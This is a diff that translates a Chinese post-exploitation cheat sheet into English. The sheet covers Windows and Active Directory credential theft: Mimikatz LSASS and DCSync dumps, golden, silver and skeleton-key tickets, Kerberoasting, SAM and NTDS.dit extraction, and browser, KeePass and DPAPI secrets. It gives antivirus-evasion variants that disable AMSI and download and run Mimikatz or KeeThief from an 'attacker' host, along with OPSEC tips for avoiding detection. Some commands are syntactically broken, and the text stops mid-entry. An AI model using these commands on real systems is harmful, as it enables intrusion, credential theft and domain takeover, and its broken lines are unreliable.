@@ -1,409 +1,409 @@
-# 内网渗透 / 后渗透速查
+# Internal-network / post-exploitation quick reference
 
-_共 128 个结构化 payload，覆盖凭据窃取 / 横向移动 / 权限提升 / 免杀 / 域渗透 / 隧道代理 / 信息收集 / 权限维持_
+_128 structured payloads covering credential theft / lateral movement / privilege escalation / AV evasion / domain compromise / tunneling and proxying / information gathering / persistence_
 
-## 类别索引
+## Category index
 
-| 类别 | 数量 |
+| Category | Count |
 |---|--:|
-| 凭证窃取 | 20 |
-| 横向移动 | 16 |
-| 权限提升 | 15 |
-| 免杀与规避 | 14 |
-| 域渗透攻击 | 14 |
-| 隧道代理 | 13 |
-| 信息收集 | 12 |
-| 权限维持 | 12 |
-| Exchange攻击 | 5 |
-| ADCS攻击 | 5 |
-| SharePoint攻击 | 2 |
+| Credential theft | 20 |
+| Lateral movement | 16 |
+| Privilege escalation | 15 |
+| AV evasion | 14 |
+| Domain compromise | 14 |
+| Tunneling and proxying | 13 |
+| Information gathering | 12 |
+| Persistence | 12 |
+| Exchange attacks | 5 |
+| ADCS attacks | 5 |
+| SharePoint attacks | 2 |
 
-## 凭证窃取
+## Credential theft
 
-### Mimikatz凭证抓取  `mimikatz-creds`
-使用Mimikatz抓取Windows系统凭证
-子类：**Mimikatz** · tags: `mimikatz` `credentials` `windows` `lsass`
+### Mimikatz credential dumping  `mimikatz-creds`
+Use Mimikatz to dump Windows system credentials
+Subcategory: **Mimikatz** · tags: `mimikatz` `credentials` `windows` `lsass`
 
-**前置条件：** 需要管理员权限；需要绕过杀毒软件；Windows系统
+**Preconditions:** administrator privileges; must bypass antivirus; Windows system
 
-**攻击链：**
+**Attack chain:**
 
-**1. 抓取所有凭证**  _[windows]_
-_抓取LSASS中的所有登录凭证_
+**1. Dump all credentials**  _[windows]_
+_Dump every logon credential from LSASS_
 ```
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
-**2. 导出LSASS**  _[windows]_
-_从LSASS转储文件中提取凭证_
+**2. Dump LSASS**  _[windows]_
+_Extract credentials from an LSASS dump file_
 ```
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
 ```
 
 **3. Pass-the-Hash**  _[windows]_
-_使用NTLM哈希进行Pass-the-Hash攻击_
+_Perform a Pass-the-Hash attack with an NTLM hash_
 ```
 mimikatz.exe "sekurlsa::pth /user:Administrator /domain:target.com /ntlm:HASH" "exit"
 ```
 
-**4. DCSync攻击**  _[windows]_
-_模拟DC同步获取域内所有用户哈希_
+**4. DCSync attack**  _[windows]_
+_Impersonate DC replication to obtain every domain user hash_
 ```
 mimikatz.exe "lsadump::dcsync /domain:target.com /user:Administrator" "exit"
 ```
 
-**5. 导出所有哈希**  _[windows]_
-_从LSA导出所有用户哈希_
+**5. Dump all hashes**  _[windows]_
+_Dump all user hashes from LSA_
 ```
 mimikatz.exe "lsadump::lsa /inject" "exit"
 ```
 
-**6. 黄金票据**  _[windows]_
-_生成黄金票据获取域管理员权限_
+**6. Golden ticket**  _[windows]_
+_Forge a golden ticket to gain Domain Admin privileges_
 ```
 mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator" "exit"
 ```
 
-**7. 白银票据**  _[windows]_
-_生成白银票据访问特定服务_
+**7. Silver ticket**  _[windows]_
+_Forge a silver ticket to access a specific service_
 ```
 mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /target:server.target.com /service:cifs /rc4:HASH /user:Administrator" "exit"
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**1. PowerShell加载**
-_通过PowerShell远程加载Mimikatz_
+**1. PowerShell loading**
+_Load Mimikatz remotely via PowerShell_
 ```
 IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
 ```
 
-**2. AMSI绕过**
-_禁用AMSI后加载Mimikatz_
+**2. AMSI bypass**
+_Disable AMSI, then load Mimikatz_
 ```
 SET-ITEM -PATH "HKLM:\SOFTWARE\Microsoft\AMSI" -NAME "AllowBlocking" -VALUE 1; IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1")
 ```
 
-**3. 混淆执行**
-_通过反射绕过AMSI_
+**3. Obfuscated execution**
+_Bypass AMSI via reflection_
 ```
 $a='[Ref].Assembly.GetType'('System.Management.Automation.AmsiUtils');$b=$a.GetField'('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
 ```
 
-**分析：** 成功执行后可获取明文密码、NTLM哈希、Kerberos票据等凭证信息。
+**Analysis:** on success you obtain credential material such as cleartext passwords, NTLM hashes and Kerberos tickets.
 
-**OPSEC：** Mimikatz会被大多数杀软检测；使用混淆或内存加载绕过检测；优先考虑使用其他更隐蔽的工具；操作LSASS会触发EDR告警
+**OPSEC:** Mimikatz is detected by most antivirus; use obfuscation or in-memory loading to evade detection; prefer stealthier tools where possible; touching LSASS triggers EDR alerts
 
 ---
 
-### Kerberoasting攻击  `kerberoasting`
-Kerberoasting攻击获取服务账户哈希
-子类：**Kerberos** · tags: `kerberoasting` `kerberos` `active-directory` `spn`
+### Kerberoasting attack  `kerberoasting`
+Kerberoasting attack to obtain service account hashes
+Subcategory: **Kerberos** · tags: `kerberoasting` `kerberos` `active-directory` `spn`
 
-**前置条件：** 域环境；任意域用户凭证；域内存在SPN账户
+**Preconditions:** a domain environment; any domain user credential; SPN accounts exist in the domain
 
-**攻击链：**
+**Attack chain:**
 
-**1. 发现SPN**  _[windows]_
-_查询域内所有SPN_
+**1. Discover SPNs**  _[windows]_
+_Query every SPN in the domain_
 ```
 setspn -T domain.com -Q */*
 ```
 
-**2. 请求服务票据**  _[windows]_
-_PowerShell请求Kerberos票据_
+**2. Request service tickets**  _[windows]_
+_Request Kerberos tickets via PowerShell_
 ```
 Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/webserver.target.com"
 ```
 
-**3. 导出票据**  _[windows]_
-_使用Mimikatz导出Kerberos票据_
+**3. Export tickets**  _[windows]_
+_Export Kerberos tickets with Mimikatz_
 ```
 mimikatz.exe "kerberos::list /export" "exit"
 ```
 
-**4. Rubeus请求**  _[windows]_
-_使用Rubeus进行Kerberoasting_
+**4. Rubeus request**  _[windows]_
+_Perform Kerberoasting with Rubeus_
 ```
 Rubeus.exe kerberoast /stats
 ```
 
 **5. Impacket GetUserSPNs**  _[linux]_
-_使用Impacket获取服务票据_
+_Obtain service tickets with Impacket_
 ```
 GetUserSPNs.py domain/user:password -dc-ip dc_ip -request
 ```
 
-**6. 离线破解**  _[linux]_
-_使用Hashcat破解Kerberos票据_
+**6. Offline cracking**  _[linux]_
+_Crack Kerberos tickets with Hashcat_
 ```
 hashcat -m 13100 kerberoast.hash wordlist.txt
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**1. RC4加密**
-_使用RC4加密，避免触发告警_
+**1. RC4 encryption**
+_Use RC4 encryption to avoid raising alerts_
 ```
 Rubeus.exe kerberoast /rc4opsec
 ```
 
-**分析：** Kerberoasting可以获取服务账户的Kerberos票据，离线破解后得到明文密码。
+**Analysis:** Kerberoasting yields service accounts' Kerberos tickets, which crack offline into cleartext passwords.
 
-**OPSEC：** Kerberoasting不需要高权限；只需要任意域用户凭证；建议使用RC4加密避免检测
+**OPSEC:** Kerberoasting needs no elevated privileges, only any domain user credential; prefer RC4 encryption to avoid detection
 
 ---
 
 ### AS-REP Roasting  `asreproasting`
-AS-REP Roasting攻击获取用户哈希
-子类：**Kerberos** · tags: `asreproasting` `kerberos` `active-directory`
+AS-REP Roasting attack to obtain user hashes
+Subcategory: **Kerberos** · tags: `asreproasting` `kerberos` `active-directory`
 
-**前置条件：** 域环境；域中存在禁用Pre-auth的用户
+**Preconditions:** a domain environment; users with pre-authentication disabled exist in the domain
 
-**攻击链：**
+**Attack chain:**
 
-**1. Rubeus攻击**  _[windows]_
-_使用Rubeus进行AS-REP Roasting_
+**1. Rubeus attack**  _[windows]_
+_Perform AS-REP Roasting with Rubeus_
 ```
 Rubeus.exe asreproast
 ```
 
-**2. Impacket攻击**  _[linux]_
-_使用Impacket获取AS-REP_
+**2. Impacket attack**  _[linux]_
+_Obtain AS-REP responses with Impacket_
 ```
 GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt
 ```
 
-**3. 查找禁用Pre-auth用户**  _[windows]_
-_查找禁用Pre-auth的用户_
+**3. Find users with pre-auth disabled**  _[windows]_
+_Find users that have pre-authentication disabled_
 ```
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
 ```
 
-**4. 破解哈希**  _[linux]_
-_使用Hashcat破解AS-REP哈希_
+**4. Crack the hashes**  _[linux]_
+_Crack AS-REP hashes with Hashcat_
 ```
 hashcat -m 18200 asrep.hash wordlist.txt
 ```
 
-**分析：** AS-REP Roasting可以获取禁用Pre-auth用户的哈希，离线破解后得到明文密码。
+**Analysis:** AS-REP Roasting yields the hashes of pre-auth-disabled users, which crack offline into cleartext passwords.
 
-**OPSEC：** 不需要任何凭证；只需要用户名；禁用Pre-auth是错误配置
+**OPSEC:** no credentials required, only a username; disabled pre-authentication is a misconfiguration
 
 ---
 
-### LaZagne凭证抓取  `lazagne-creds`
-使用LaZagne抓取各种应用程序凭证
-子类：**工具** · tags: `lazagne` `credentials` `browsers` `applications`
+### LaZagne credential dumping  `lazagne-creds`
+Use LaZagne to dump credentials from a variety of applications
+Subcategory: **Tool** · tags: `lazagne` `credentials` `browsers` `applications`
 
-**前置条件：** 目标机器访问权限；LaZagne工具
+**Preconditions:** access to the target machine; the LaZagne tool
 
-**攻击链：**
+**Attack chain:**
 
-**1. 抓取所有凭证**  _[windows]_
-_抓取所有支持的凭证_
+**1. Dump all credentials**  _[windows]_
+_Dump every supported credential type_
 ```
 laZagne.exe all
 ```
 
-**2. 浏览器凭证**  _[windows]_
-_抓取浏览器保存的密码_
+**2. Browser credentials**  _[windows]_
+_Dump passwords saved in the browser_
 ```
 laZagne.exe browsers
 ```
 
-**3. WiFi凭证**  _[windows]_
-_抓取WiFi密码_
+**3. WiFi credentials**  _[windows]_
+_Dump WiFi passwords_
 ```
 laZagne.exe wifi
 ```
 
-**4. 邮件客户端**  _[windows]_
-_抓取邮件客户端密码_
+**4. Mail clients**  _[windows]_
+_Dump mail client passwords_
 ```
 laZagne.exe mails
 ```
 
-**5. 数据库凭证**  _[windows]_
-_抓取数据库客户端密码_
+**5. Database credentials**  _[windows]_
+_Dump database client passwords_
 ```
 laZagne.exe databases
 ```
 
-**6. Linux版本**  _[linux]_
-_Linux版本抓取_
+**6. Linux version**  _[linux]_
+_Dump using the Linux build_
 ```
 python laZagne.py all
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**1. 混淆执行**
-_Base64编码执行_
+**1. Obfuscated execution**
+_Execute via Base64 encoding_
 ```
 python -c "exec(__import__(\"base64\").b64decode(\"BASE64_PAYLOAD\"))"
 ```
 
-**分析：** LaZagne可以从浏览器、邮件客户端、数据库客户端等多种应用程序中提取保存的凭证。
+**Analysis:** LaZagne extracts saved credentials from many applications, including browsers, mail clients and database clients.
 
-**OPSEC：** LaZagne会被杀软检测；考虑使用混淆或内存加载；可以只运行特定模块
+**OPSEC:** LaZagne is detected by antivirus; consider obfuscation or in-memory loading; you can run only specific modules
 
 ---
 
-### SAM数据库导出  `sam-dump`
-导出Windows SAM数据库获取本地账户哈希
-子类：**SAM** · tags: `sam` `hash` `windows` `local`
+### SAM database dump  `sam-dump`
+Dump the Windows SAM database to obtain local account hashes
+Subcategory: **SAM** · tags: `sam` `hash` `windows` `local`
 
-**前置条件：** 管理员权限；Windows系统
+**Preconditions:** administrator privileges; Windows system
 
-**攻击链：**
+**Attack chain:**
 
-**1. reg导出**  _[windows]_
-_导出SAM和SYSTEM配置单元_
+**1. reg export**  _[windows]_
+_Export the SAM and SYSTEM registry hives_
 ```
 reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive
 ```
 
-**2. Impacket解析**  _[linux]_
-_使用Impacket解析SAM_
+**2. Impacket parsing**  _[linux]_
+_Parse the SAM with Impacket_
 ```
 secretsdump.py -sam sam.hive -system system.hive LOCAL
 ```
 
-**3. Mimikatz导出**  _[windows]_
-_使用Mimikatz导出SAM_
+**3. Mimikatz dump**  _[windows]_
+_Dump the SAM with Mimikatz_
 ```
 mimikatz.exe "lsadump::sam" "exit"
 ```
 
 **4. Volume Shadow Copy**  _[windows]_
-_从卷影副本复制SAM_
+_Copy the SAM from a volume shadow copy_
 ```
 vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam.hive
 ```
 
-**分析：** SAM数据库包含本地账户的NTLM哈希，可以用于破解或Pass-the-Hash。
+**Analysis:** the SAM database holds local accounts' NTLM hashes, usable for cracking or Pass-the-Hash.
 
-**OPSEC：** 需要管理员权限；操作注册表可能触发告警；卷影副本方法更隐蔽
+**OPSEC:** administrator privileges required; touching the registry may raise alerts; the volume shadow copy method is stealthier
 
 ---
 
-### NTDS.dit导出  `ntds-dump`
-导出Active Directory数据库获取所有域用户哈希
-子类：**NTDS** · tags: `ntds` `active-directory` `hash` `domain`
+### NTDS.dit dump  `ntds-dump`
+Dump the Active Directory database to obtain every domain user hash
+Subcategory: **NTDS** · tags: `ntds` `active-directory` `hash` `domain`
 
-**前置条件：** 域管理员权限；域控制器访问权限
+**Preconditions:** Domain Admin privileges; access to a domain controller
 
-**攻击链：**
+**Attack chain:**
 
-**1. ntdsutil快照**  _[windows]_
-_使用ntdsutil创建IFM快照_
+**1. ntdsutil snapshot**  _[windows]_
+_Create an IFM snapshot with ntdsutil_
 ```
 ntdsutil "activate instance ntds" "ifm" "create full c:\temp" "quit" "quit"
 ```
 
 **2. Volume Shadow Copy**  _[windows]_
-_从卷影副本复制NTDS.dit_
+_Copy NTDS.dit from a volume shadow copy_
 ```
 vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
 ```
 
-**3. Impacket解析**  _[linux]_
-_使用Impacket解析NTDS.dit_
+**3. Impacket parsing**  _[linux]_
+_Parse NTDS.dit with Impacket_
 ```
 secretsdump.py -ntds ntds.dit -system system.hive LOCAL
 ```
 
-**4. Impacket远程转储**  _[linux]_
-_远程转储域哈希_
+**4. Impacket remote dump**  _[linux]_
+_Dump domain hashes remotely_
 ```
 secretsdump.py domain/admin:password@dc_ip -just-dc
 ```
 
 **5. Mimikatz DCSync**  _[windows]_
-_使用DCSync同步所有哈希_
+_Replicate all hashes via DCSync_
 ```
 mimikatz.exe "lsadump::dcsync /domain:target.com /all" "exit"
 ```
 
-**分析：** NTDS.dit包含域内所有用户的哈希，可以用于破解或Pass-the-Hash。
+**Analysis:** NTDS.dit holds every domain user's hash, usable for cracking or Pass-the-Hash.
 
-**OPSEC：** 需要域管理员权限；DCSync方法更隐蔽；操作可能触发大量告警
+**OPSEC:** Domain Admin privileges required; the DCSync method is stealthier; the operation may trigger many alerts
 
 ---
 
-### GPP密码提取  `gpp-password`
-提取组策略首选项中的密码
-子类：**GPP** · tags: `gpp` `group-policy` `password` `xml`
+### GPP password extraction  `gpp-password`
+Extract passwords stored in Group Policy Preferences
+Subcategory: **GPP** · tags: `gpp` `group-policy` `password` `xml`
 
-**前置条件：** 域环境；任意域用户凭证
+**Preconditions:** a domain environment; any domain user credential
 
-**攻击链：**
+**Attack chain:**
 
-**1. 查找GPP文件**  _[linux]_
-_查找SYSVOL中的XML文件_
+**1. Find GPP files**  _[linux]_
+_Search SYSVOL for XML files_
 ```
 find /domain/sysvol -name "*.xml" 2>/dev/null
 ```
 
-**2. PowerShell查找**  _[windows]_
-_PowerShell查找GPP文件_
+**2. PowerShell search**  _[windows]_
+_Find GPP files via PowerShell_
 ```
 Get-ChildItem -Path "\\domain.com\SYSVOL" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "\.xml$"}
 ```
 
-**3. PowerView提取**  _[windows]_
-_使用PowerView提取GPP密码_
+**3. PowerView extraction**  _[windows]_
+_Extract GPP passwords with PowerView_
 ```
 Get-NetGPPPassword
 ```
 
 **4. gpp-decrypt**  _[linux]_
-_解密GPP密码哈希_
+_Decrypt the GPP password hash_
 ```
 gpp-decrypt HASH
 ```
 
-**5. Impacket提取**  _[linux]_
-_使用Impacket提取GPP密码_
+**5. Impacket extraction**  _[linux]_
+_Extract GPP passwords with Impacket_
 ```
 Get-GPPPassword.py domain/user:password@dc_ip
 ```
 
-**分析：** GPP密码使用公开的密钥加密，可以被解密获取明文密码。
+**Analysis:** GPP passwords are encrypted with a publicly known key and can be decrypted to cleartext.
 
-**OPSEC：** GPP密码是常见的信息泄露点；只需要普通域用户权限；MS14-025修复后新密码不会被存储
+**OPSEC:** GPP passwords are a common information-disclosure point; only ordinary domain user privileges are needed; after the MS14-025 fix new passwords are no longer stored
 
 ---
 
-### Mimikatz高级技巧  `mimikatz-advanced`
-Mimikatz高级凭证提取和利用技术
-子类：**Mimikatz** · tags: `mimikatz` `credentials` `advanced`
+### Advanced Mimikatz techniques  `mimikatz-advanced`
+Advanced Mimikatz credential extraction and abuse techniques
+Subcategory: **Mimikatz** · tags: `mimikatz` `credentials` `advanced`
 
-**前置条件：** 管理员权限；Mimikatz工具
+**Preconditions:** administrator privileges; the Mimikatz tool
 
-**攻击链：**
+**Attack chain:**
 
-**1. DCSync攻击**  _[windows]_
-_模拟DC同步获取域管哈希_
+**1. DCSync attack**  _[windows]_
+_Impersonate DC replication to obtain the Domain Admin hash_
 ```
 lsadump::dcsync /domain:domain.com /user:Administrator
 ```
 
-**2. 黄金票据生成**  _[windows]_
-_生成黄金票据并注入_
+**2. Golden ticket generation**  _[windows]_
+_Forge a golden ticket and inject it_
 ```
 kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt
 ```
 
-**3. 白银票据生成**  _[windows]_
-_生成白银票据访问特定服务_
+**3. Silver ticket generation**  _[windows]_
+_Forge a silver ticket to access a specific service_
 ```
 kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt
 ```
 
-**4. Skeleton Key植入**  _[windows]_
-_植入万能密码mimikatz_
+**4. Skeleton Key implant**  _[windows]_
+_Implant a skeleton key with mimikatz_
 ```
 privilege::debug
 misc::skeleton
@@ -411,683 +411,683 @@ misc::skeleton
 
 ---
 
-### 浏览器凭证提取  `browser-creds`
-从浏览器中提取保存的密码和Cookie
-子类：**浏览器** · tags: `browser` `credentials` `chrome` `firefox`
+### Browser credential extraction  `browser-creds`
+Extract saved passwords and cookies from browsers
+Subcategory: **Browser** · tags: `browser` `credentials` `chrome` `firefox`
 
-**前置条件：** 用户权限；浏览器已保存密码
+**Preconditions:** user-level privileges; the browser has saved passwords
 
-**攻击链：**
+**Attack chain:**
 
-**1. Chrome密码提取**  _[windows]_
-_复制Chrome登录数据库_
+**1. Chrome password extraction**  _[windows]_
+_Copy Chrome's Login Data database_
 ```
 Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" | Copy-Item -Destination "C:\temp\Login Data"
 ```
 
-**2. Chrome Cookie提取**  _[windows]_
-_复制Chrome Cookie数据库_
+**2. Chrome cookie extraction**  _[windows]_
+_Copy Chrome's cookie database_
 ```
 Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies" | Copy-Item -Destination "C:\temp\Cookies"
 ```
 
-**3. 使用SharpWeb**  _[windows]_
-_使用SharpWeb提取浏览器凭证_
+**3. Using SharpWeb**  _[windows]_
+_Extract browser credentials with SharpWeb_
 ```
 SharpWeb.exe --browser chrome
 ```
 
-**4. 使用HackBrowserData**
-_提取Chrome所有数据_
+**4. Using HackBrowserData**
+_Extract all Chrome data_
 ```
 hack-browser-data.exe -b chrome
 ```
 
 ---
 
-### DPAPI凭证提取  `dpapi-creds`
-从DPAPI保护存储中提取凭证
-子类：**DPAPI** · tags: `dpapi` `credentials` `windows`
+### DPAPI credential extraction  `dpapi-creds`
+Extract credentials from DPAPI-protected storage
+Subcategory: **DPAPI** · tags: `dpapi` `credentials` `windows`
 
-**前置条件：** 用户权限；DPAPI master key
+**Preconditions:** user-level privileges; the DPAPI master key
 
-**攻击链：**
+**Attack chain:**
 
-**1. 枚举DPAPI凭据**  _[windows]_
-_查找DPAPI保护的凭据文件_
+**1. Enumerate DPAPI credentials**  _[windows]_
+_Find DPAPI-protected credential files_
 ```
 Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials" -Force
 ```
 
-**2. 使用Mimikatz解密**  _[windows]_
-_解密DPAPI凭据_
+**2. Decrypt with Mimikatz**  _[windows]_
+_Decrypt DPAPI credentials_
 ```
 dpapi::cred /in:C:\Users\user\AppData\Roaming\Microsoft\Credentials\XXX
 ```
 
-**3. 获取Master Key**  _[windows]_
-_从内存获取DPAPI master key_
+**3. Obtain the master key**  _[windows]_
+_Recover the DPAPI master key from memory_
 ```
 sekurlsa::dpapi
 ```
 
 ---
 
-### RDP凭证提取  `rdp-creds`
-提取保存的RDP连接密码
-子类：**RDP** · tags: `rdp` `credentials` `windows`
+### RDP credential extraction  `rdp-creds`
+Extract saved RDP connection passwords
+Subcategory: **RDP** · tags: `rdp` `credentials` `windows`
 
-**前置条件：** 用户权限；已保存RDP密码
+**Preconditions:** user-level privileges; saved RDP passwords
 
-**攻击链：**
+**Attack chain:**
 
-**1. 查找RDP文件**  _[windows]_
-_查找RDP连接文件_
+**1. Find RDP files**  _[windows]_
+_Find RDP connection files_
 ```
 Get-ChildItem -Path "$env:USERPROFILE\Documents\*.rdp" -Recurse
 ```
 
-**2. 提取RDP密码**  _[windows]_
-_列出保存的凭据_
+**2. Extract RDP passwords**  _[windows]_
+_List saved credentials_
 ```
 cmdkey /list
 ```
 
-**3. 使用Mimikatz**  _[windows]_
-_解密RDP保存的密码_
+**3. Using Mimikatz**  _[windows]_
+_Decrypt the saved RDP password_
 ```
 dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\XXX
 ```
 
 ---
 
-### WiFi凭证提取  `wifi-creds`
-提取保存的WiFi密码
-子类：**WiFi** · tags: `wifi` `credentials` `windows`
+### WiFi credential extraction  `wifi-creds`
+Extract saved WiFi passwords
+Subcategory: **WiFi** · tags: `wifi` `credentials` `windows`
 
-**前置条件：** 管理员权限；已连接WiFi
+**Preconditions:** administrator privileges; a connected WiFi network
 
-**攻击链：**
+**Attack chain:**
 
-**1. 列出WiFi配置文件**  _[windows]_
-_显示所有WiFi配置文件_
+**1. List WiFi profiles**  _[windows]_
+_Show every WiFi profile_
 ```
 netsh wlan show profiles
 ```
 
-**2. 提取WiFi密码**  _[windows]_
-_显示WiFi密码_
+**2. Extract WiFi passwords**  _[windows]_
+_Show WiFi passwords_
 ```
 netsh wlan show profile name="WiFi_Name" key=clear
 ```
 
 ---
 
-### Windows Vault凭证  `vault-creds`
-从Windows凭据管理器提取凭证
-子类：**Vault** · tags: `vault` `credentials` `windows`
+### Windows Vault credentials  `vault-creds`
+Extract credentials from the Windows Credential Manager
+Subcategory: **Vault** · tags: `vault` `credentials` `windows`
 
-**前置条件：** 用户权限；已保存凭据
+**Preconditions:** user-level privileges; saved credentials
 
-**攻击链：**
+**Attack chain:**
 
-**1. 列出Vault凭据**  _[windows]_
-_列出所有Vault_
+**1. List Vault credentials**  _[windows]_
+_List every Vault_
 ```
 vaultcmd /list
 ```
 
-**2. 导出Vault凭据**  _[windows]_
-_列出Windows凭据_
+**2. Export Vault credentials**  _[windows]_
+_List Windows credentials_
 ```
 vaultcmd /listcreds:"Windows Credentials" /all
 ```
 
-**3. 使用Mimikatz**  _[windows]_
-_从内存提取凭据管理器密码_
+**3. Using Mimikatz**  _[windows]_
+_Extract Credential Manager passwords from memory_
 ```
 sekurlsa::credman
 ```
 
 ---
 
-### KeePass凭证提取  `keepass-dump`
-从KeePass数据库提取密码
-子类：**KeePass** · tags: `keepass` `credentials` `password-manager`
+### KeePass credential extraction  `keepass-dump`
+Extract passwords from a KeePass database
+Subcategory: **KeePass** · tags: `keepass` `credentials` `password-manager`
 
-**前置条件：** KeePass数据库文件；主密码或内存转储
+**Preconditions:** the KeePass database file; the master password or a memory dump
 
-**攻击链：**
+**Attack chain:**
 
-**1. 查找KeePass数据库**  _[windows]_
-_搜索KeePass数据库文件_
+**1. Find the KeePass database**  _[windows]_
+_Search for KeePass database files_
 ```
 Get-ChildItem -Path C:\ -Filter "*.kdbx" -Recurse -ErrorAction SilentlyContinue
 ```
 
-**2. 内存提取主密码**  _[windows]_
-_从KeePass进程内存提取_
+**2. Recover the master password from memory**  _[windows]_
+_Extract from the KeePass process memory_
 ```
-使用KeePassDump或KeeThief从内存提取主密码
+Recover the master password from memory using KeePassDump or KeeThief
 ```
 
-**3. 使用KeeThief**  _[windows]_
-_PowerShell提取KeePass密码_
+**3. Using KeeThief**  _[windows]_
+_Extract KeePass passwords via PowerShell_
 ```
 powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/KeeThief.ps1'); Get-KeePassPw
 ```
 
 ---
 
-### LSA Secrets提取  `lsa-secrets`
-从LSA Secrets提取敏感数据
-子类：**LSA** · tags: `lsa` `secrets` `windows`
+### LSA Secrets extraction  `lsa-secrets`
+Extract sensitive data from LSA Secrets
+Subcategory: **LSA** · tags: `lsa` `secrets` `windows`
 
-**前置条件：** SYSTEM权限
+**Preconditions:** SYSTEM privileges
 
-**攻击链：**
+**Attack chain:**
 
-**1. 使用Mimikatz**  _[windows]_
-_提取LSA Secrets_
+**1. Using Mimikatz**  _[windows]_
+_Extract LSA Secrets_
 ```
 lsadump::secrets
 ```
 
-**2. 使用reg save**  _[windows]_
-_导出注册表hive离线分析_
+**2. Using reg save**  _[windows]_
+_Export the registry hive for offline analysis_
 ```
 reg save HKLM\SECURITY security.hive
 reg save HKLM\SYSTEM system.hive
 ```
 
-**3. 使用Impacket**  _[linux]_
-_离线提取LSA Secrets_
+**3. Using Impacket**  _[linux]_
+_Extract LSA Secrets offline_
 ```
 secretsdump.py -security security.hive -system system.hive LOCAL
 ```
 
 ---
 
-### 缓存凭证提取  `cached-creds`
-提取域缓存凭证
-子类：**缓存** · tags: `cached` `credentials` `domain`
+### Cached credential extraction  `cached-creds`
+Extract cached domain credentials
+Subcategory: **Cached** · tags: `cached` `credentials` `domain`
 
-**前置条件：** SYSTEM权限；域环境
+**Preconditions:** SYSTEM privileges; a domain environment
 
-**攻击链：**
+**Attack chain:**
 
-**1. 使用Mimikatz**  _[windows]_
-_提取缓存域凭证_
+**1. Using Mimikatz**  _[windows]_
+_Extract cached domain credentials_
 ```
 lsadump::cache
 ```
 
-**2. 使用reg save**  _[windows]_
-_导出SECURITY hive_
+**2. Using reg save**  _[windows]_
+_Export the SECURITY hive_
 ```
 reg save HKLM\SECURITY security.hive
 ```
 
-**3. 离线破解**  _[linux]_
-_缓存凭证可离线破解_
+**3. Offline cracking**  _[linux]_
+_Cached credentials can be cracked offline_
 ```
-使用hashcat破解缓存的域凭证
+Crack cached domain credentials with hashcat
 ```
 
 ---
 
-### DCSync攻击  `dcsync-attack`
-模拟域控制器同步获取凭证
-子类：**域渗透** · tags: `dcsync` `domain-controller` `mimikatz`
+### DCSync attack  `dcsync-attack`
+Impersonate domain controller replication to obtain credentials
+Subcategory: **Domain compromise** · tags: `dcsync` `domain-controller` `mimikatz`
 
-**前置条件：** 域管理员权限或特定权限
+**Preconditions:** Domain Admin privileges, or specific replication rights
 
-**攻击链：**
+**Attack chain:**
 
-**1. 使用Mimikatz**  _[windows]_
-_使用Mimikatz执行DCSync_
+**1. Using Mimikatz**  _[windows]_
+_Run DCSync with Mimikatz_
 ```
 mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator
 ```
 
-**2. 使用impacket**  _[linux]_
-_使用impacket执行DCSync_
+**2. Using impacket**  _[linux]_
+_Run DCSync with impacket_
 ```
 python secretsdump.py -just-dc-user Administrator domain.com/user:password@dc_ip
 ```
 
-**3. 导出所有哈希**  _[windows]_
-_导出域内所有用户哈希_
+**3. Dump all hashes**  _[windows]_
+_Dump every domain user hash_
 ```
 mimikatz # lsadump::dcsync /domain:domain.com /all /csv
 ```
 
-**4. 权限要求**
-_DCSync所需权限_
+**4. Privilege requirements**
+_Rights required for DCSync_
 ```
-需要以下权限之一:
+One of the following rights is required:
 - Domain Admin
 - Enterprise Admin
-- 复制目录更改权限
+- Replicating Directory Changes rights
 ```
 
 ---
 
-### 黄金票据攻击  `golden-ticket`
-使用krbtgt哈希生成黄金票据
-子类：**域持久化** · tags: `golden-ticket` `krbtgt` `kerberos`
+### Golden ticket attack  `golden-ticket`
+Forge a golden ticket using the krbtgt hash
+Subcategory: **Domain persistence** · tags: `golden-ticket` `krbtgt` `kerberos`
 
-**前置条件：** krbtgt账户哈希；域SID
+**Preconditions:** the krbtgt account hash; the domain SID
 
-**攻击链：**
+**Attack chain:**
 
-**1. 获取krbtgt哈希**  _[windows]_
-_获取krbtgt账户哈希_
+**1. Obtain the krbtgt hash**  _[windows]_
+_Obtain the krbtgt account hash_
 ```
 mimikatz # lsadump::lsa /inject /name:krbtgt
 ```
 
-**2. 获取域SID**  _[windows]_
-_获取域SID_
